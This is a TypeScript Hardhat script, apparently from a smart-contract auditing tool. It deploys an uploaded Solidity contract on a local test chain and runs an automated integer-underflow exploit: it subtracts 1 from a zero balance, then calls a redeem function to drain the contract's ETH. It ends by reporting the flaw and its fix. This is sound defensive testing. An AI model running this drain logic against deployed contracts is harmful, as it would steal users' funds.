import hre from "hardhat";
import path from "path";
import { parseEther, formatEther, ZeroAddress, MaxUint256 } from "ethers";
import { buildResult } from "./buildResult";
import { seedVault } from "./seedVault";
import { analyzeOverflow } from "./analyzeOverflow";
import { analyzeReentrancy } from "./analyzeReentrancy";
import type { ContractAnalysis } from "./analysisTypes";

async function main() {
  const contractName = process.env.UPLOADED_CONTRACT_NAME;
  const fileName = process.env.UPLOADED_FILE_NAME;
  if (!contractName || !fileName) throw new Error("UPLOADED_CONTRACT_NAME and UPLOADED_FILE_NAME must be set");

  const startTime = Date.now();
  const signers = await hre.ethers.getSigners();
  const [deployer, attacker] = signers;

  const fullyQualified = `contracts/uploaded/${fileName}.sol:${contractName}`;
  const VictimFactory = await hre.ethers.getContractFactory(fullyQualified);
  const iface = VictimFactory.interface;

  // --- AI-powered detection via ANALYSIS_JSON ---
  let tokenFnName: string | null = null;
  let tokenFnParamTypes: string[] | null = null;
  let redeemFnName: string | null = null;
  let mappingName: string | null = null;
  let usedAiAnalysis = false;

  const rawAnalysisJson = process.env.ANALYSIS_JSON;
  if (rawAnalysisJson) {
    try {
      const fullAnalysis = JSON.parse(rawAnalysisJson);
      const ov = fullAnalysis.overflow;
      if (ov && typeof ov.found === "boolean") {
        const tokenFnField  = ov.tokenFn  ?? ov.tokenFunction;
        const redeemFnField = ov.redeemFn ?? ov.redeemFunction;
        if (ov.found && tokenFnField) {
          const tFn = iface.getFunction(tokenFnField);
          if (tFn !== null) {
            tokenFnName = tokenFnField;
            tokenFnParamTypes = tFn.inputs.map((i: any) => i.type);
            usedAiAnalysis = true;
            console.log(`[overflow] AI analysis: tokenFn=${tokenFnName}(${tokenFnParamTypes})`);
          }
          if (redeemFnField) {
            const rFn = iface.getFunction(redeemFnField);
            if (rFn !== null) redeemFnName = redeemFnField;
          }
        } else if (!ov.found) {
          console.log(`[overflow] AI: no overflow vulnerability detected`);
        }
      }
    } catch (e: any) {
      console.warn(`[overflow] Could not parse ANALYSIS_JSON (${e.message}) — falling back`);
    }
  }

  // --- Static analysis fallback: detect unchecked subtraction in source ---
  if (!usedAiAnalysis && !tokenFnName) {
    const sourcePath = path.join(__dirname, "../../contracts/uploaded", `${fileName}.sol`);
    try {
      const ovResult = analyzeOverflow(sourcePath);
      if (ovResult.found && ovResult.uncheckedFn) {
        const fn = iface.getFunction(ovResult.uncheckedFn);
        if (fn) {
          tokenFnName = ovResult.uncheckedFn;
          tokenFnParamTypes = fn.inputs.map((i: any) => i.type);
          mappingName = ovResult.mappingName;
          console.log(`[overflow] Static analysis: uncheckedFn=${tokenFnName}(${tokenFnParamTypes}), mapping=${mappingName}`);
        }
      }
    } catch { /* source read failed */ }
  }

  // --- Legacy ABI fallback: check for sendTokens/transfer + redeem ---
  if (!tokenFnName) {
    if (iface.getFunction("sendTokens")) tokenFnName = "sendTokens";
    else if (iface.getFunction("transfer")) tokenFnName = "transfer";
    if (iface.getFunction("redeem")) redeemFnName = "redeem";
    if (tokenFnName) {
      const fn = iface.getFunction(tokenFnName);
      tokenFnParamTypes = fn ? fn.inputs.map((i: any) => i.type) : null;
    }
    if (tokenFnName && redeemFnName) {
      console.log(`[overflow] Fallback ABI detection: tokenFn=${tokenFnName}, redeemFn=${redeemFnName}`);
    }
  }

  // --- No pattern found ---
  if (!tokenFnName) {
    const victim = await VictimFactory.deploy();
    await victim.waitForDeployment();
    const victimAddress = await victim.getAddress();
    const balance: bigint = await hre.ethers.provider.getBalance(victimAddress);
    const result = buildResult({
      contractName, contractAddress: victimAddress, attackType: "overflow",
      targetFunction: "N/A", severity: "Critical",
      initialBalance: balance, finalBalance: balance, stolenAmount: 0n,
      startTime, endTime: Date.now(), transactions: [],
      timeline: [`${contractName} deployed`, "No unchecked arithmetic or overflow pattern found"],
      report: {
        vulnerabilityType: "Integer Overflow/Underflow",
        affectedFunction: "N/A",
        explanation: "Contract does not have a detectable unchecked arithmetic pattern.",
        fix: "N/A",
      },
    });
    process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
    return;
  }

  // --- Deploy and seed ---
  const isConstructorPayable = iface.deploy.payable;
  const victim = isConstructorPayable
    ? await VictimFactory.deploy({ value: parseEther("5") })
    : await VictimFactory.deploy();
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  // Seed vault with pooled funds
  let seedFnInfo: { name: string; paramTypes: string[]; isPayable: boolean } | null = null;
  try {
    if (rawAnalysisJson) {
      seedFnInfo = (JSON.parse(rawAnalysisJson) as ContractAnalysis).seedFn ?? null;
    }
  } catch { /* ignore */ }
  if (!seedFnInfo) {
    const sourcePath = path.join(__dirname, "../../contracts/uploaded", `${fileName}.sol`);
    try {
      const reentrancyResult = analyzeReentrancy(sourcePath);
      if (reentrancyResult.depositFunction) seedFnInfo = reentrancyResult.depositFunction;
    } catch { /* ignore */ }
  }
  await seedVault(victim, signers, seedFnInfo);

  // Seed with extra ETH if possible
  if (!isConstructorPayable) {
    if (seedFnInfo) {
      try {
        const dFnAbi = iface.getFunction(seedFnInfo.name);
        const args = dFnAbi?.inputs.length > 0 && dFnAbi.inputs[0].type === "uint256"
          ? [parseEther("5")]
          : [];
        await (victim as any).connect(deployer)[seedFnInfo.name](...args, { value: parseEther("5") });
      } catch { /* already funded */ }
    } else if (iface.getFunction("buy")) {
      try { await (victim as any).buy({ value: parseEther("5") }); } catch { /* ignore */ }
    } else {
      try { await deployer.sendTransaction({ to: victimAddress, value: parseEther("5") }); } catch { /* no receive */ }
    }
  }

  const initialBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);

  // --- Determine attack pattern based on function signature ---
  const tokenFnAbi = iface.getFunction(tokenFnName);
  const paramTypes = tokenFnParamTypes ?? (tokenFnAbi?.inputs.map((i: any) => i.type) ?? []);
  const fnSig = `${tokenFnName}(${paramTypes.join(",")})`;

  // Pattern A: tokenFn(address, uint256) — classic overflow attacker
  const isPatternA = paramTypes.length >= 2 && paramTypes[0] === "address" && paramTypes[1] === "uint256";
  // Pattern B: tokenFn(uint256) — direct call from attacker EOA
  const isPatternB = paramTypes.length === 1 && paramTypes[0] === "uint256";

  const t1 = Date.now();
  let underflowSucceeded = false;
  let drainSucceeded = false;
  let attackerAddress = attacker.address;
  let stolenAmount = 0n;

  if (isPatternA) {
    // ── Pattern A: tokenFn(address, uint256) + redeemFn ──────────────────────
    const triggerData = iface.encodeFunctionData(tokenFnName, [ZeroAddress, 1n]);

    let PRICE: bigint = parseEther("0.1");
    try { PRICE = await (victim as any).PRICE(); } catch { /* use default */ }
    const drainTokens = initialBalance > 0n ? initialBalance / PRICE : 0n;

    const AttackerFactory = await hre.ethers.getContractFactory("OverflowAttacker");
    const attackerContract = await AttackerFactory.connect(attacker).deploy();
    await attackerContract.waitForDeployment();
    attackerAddress = await attackerContract.getAddress();

    if (redeemFnName) {
      const redeemFnAbi = iface.getFunction(redeemFnName);
      const extractData = redeemFnAbi && redeemFnAbi.inputs.length === 0
        ? iface.encodeFunctionData(redeemFnName, [])
        : iface.encodeFunctionData(redeemFnName, [drainTokens]);

      try {
        await (attackerContract as any).connect(attacker).attack(victimAddress, triggerData, extractData);
        underflowSucceeded = true;
        drainSucceeded = true;
      } catch { /* attack failed */ }
    } else {
      // No redeem — just try the underflow trigger
      try {
        await (victim as any).connect(attacker)[tokenFnName](ZeroAddress, 1n);
        underflowSucceeded = true;
      } catch { /* checked arithmetic */ }
    }
  } else if (isPatternB) {
    // ── Pattern B: tokenFn(uint256) — direct call from attacker ──────────────
    // Call with a small amount (1) to trigger underflow when attacker has 0 in mapping
    try {
      await (victim as any).connect(attacker)[tokenFnName](1n);
      underflowSucceeded = true;
      console.log(`[overflow] ${tokenFnName}(1) succeeded — unchecked underflow confirmed`);
    } catch {
      console.log(`[overflow] ${tokenFnName}(1) reverted — arithmetic is checked`);
    }

    // If underflow succeeded and there's a redeemFn, try to drain ETH
    if (underflowSucceeded && redeemFnName) {
      const redeemFnAbi = iface.getFunction(redeemFnName);
      try {
        if (redeemFnAbi && redeemFnAbi.inputs.length === 0) {
          await (victim as any).connect(attacker)[redeemFnName]();
        } else {
          await (victim as any).connect(attacker)[redeemFnName](initialBalance);
        }
        drainSucceeded = true;
      } catch { /* no drain possible */ }
    }
  }

  const endTime = Date.now();
  const finalBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
  stolenAmount = initialBalance > finalBalance ? initialBalance - finalBalance : 0n;
  const attackerBal: bigint = await hre.ethers.provider.getBalance(attackerAddress);
  const exploited = stolenAmount > 0n;
  const mapLabel = mappingName ?? "balance";

  const result = buildResult({
    contractName,
    contractAddress: victimAddress,
    attackType: "overflow",
    targetFunction: fnSig,
    severity: "Critical",
    initialBalance,
    finalBalance,
    stolenAmount,
    patternDetected: underflowSucceeded,
    startTime,
    endTime,
    transactions: underflowSucceeded
      ? [
          {
            step: 1,
            description: `Vault seeded with ${formatEther(initialBalance)} ETH`,
            from: deployer.address, to: victimAddress,
            value: formatEther(initialBalance), unit: "ETH",
            timestampMs: t1 - 100,
            balanceAfter: { victim: formatEther(initialBalance), attacker: "0.0" },
          },
          {
            step: 2,
            description: isPatternA
              ? `Attacker calls ${tokenFnName}(address(0), 1) with 0 ${mapLabel}`
              : `Attacker calls ${tokenFnName}(1) with 0 ${mapLabel}`,
            from: attacker.address, to: victimAddress,
            value: "0.0", unit: "ETH",
            timestampMs: t1,
            balanceAfter: { victim: formatEther(initialBalance), attacker: `type(uint256).max ${mapLabel}` },
          },
          ...(exploited ? [{
            step: 3,
            description: `Attacker redeems inflated ${mapLabel} → drains vault via ${redeemFnName}()`,
            from: attackerAddress, to: victimAddress,
            value: formatEther(stolenAmount), unit: "ETH",
            timestampMs: endTime,
            balanceAfter: { victim: formatEther(finalBalance), attacker: formatEther(attackerBal) },
          }] : [{
            step: 3,
            description: `Underflow confirmed — ${mapLabel} = type(uint256).max — no ETH payout function found`,
            from: attacker.address, to: victimAddress,
            value: "0.0", unit: "ETH",
            timestampMs: endTime,
            balanceAfter: { victim: formatEther(initialBalance), attacker: "0.0" },
          }]),
        ]
      : [],
    timeline: underflowSucceeded
      ? [
          `${contractName} deployed`,
          `Vault seeded with ${formatEther(initialBalance)} ETH`,
          `${fnSig} called with 0 ${mapLabel}`,
          `Unchecked subtraction: 0 - 1 = type(uint256).max`,
          exploited
            ? `Redeemed via ${redeemFnName}() — ${formatEther(stolenAmount)} ETH drained — VULNERABLE`
            : `Underflow confirmed — no ETH payout tied to ${mapLabel} — VULNERABLE (code-level)`,
        ]
      : [
          `${contractName} deployed`,
          `${fnSig} pattern found`,
          "Attack reverted — arithmetic is checked — SAFE",
        ],
    report: {
      vulnerabilityType: "Integer Overflow/Underflow",
      affectedFunction: fnSig,
      explanation: underflowSucceeded
        ? exploited
          ? `Unchecked subtraction in ${fnSig} allows underflow. An attacker with 0 ${mapLabel} subtracts 1 to get type(uint256).max, then redeems via ${redeemFnName}() for all ETH.`
          : `Unchecked subtraction in ${fnSig} allows underflow. An attacker with 0 ${mapLabel} subtracts 1 to get type(uint256).max. While no ETH payout is tied to ${mapLabel} in this contract, the unchecked arithmetic is a real vulnerability that could be exploited if the contract is extended.`
        : `${fnSig} pattern found but attack reverted. The contract uses checked arithmetic.`,
      fix: underflowSucceeded
        ? "Remove the unchecked block around the subtraction. Solidity 0.8+ checks arithmetic by default. Also add require() guards to validate inputs."
        : "No fix needed — arithmetic is correctly checked.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
